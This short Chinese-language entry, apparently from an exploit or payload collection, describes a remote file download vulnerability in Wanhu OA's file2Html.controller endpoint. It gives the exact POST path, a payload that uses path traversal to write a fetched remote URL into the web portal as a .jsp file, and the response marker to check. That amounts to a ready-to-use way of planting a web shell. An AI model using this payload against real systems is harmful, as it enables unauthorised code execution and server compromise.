# 万户OAfile2Html.controller远程文件下载漏洞

万户OAfile2Html.controller远程文件下载 ｜ 其他 ｜ —
- **请求**：`POST /defaultroot/yzConvertFile/file2Html.controller HTTP/1.1`

**Payload**
```
fileName=qwe.jsp&path=../platform/portal/&url=http://www.baidu.com
```
- **响应特征**：404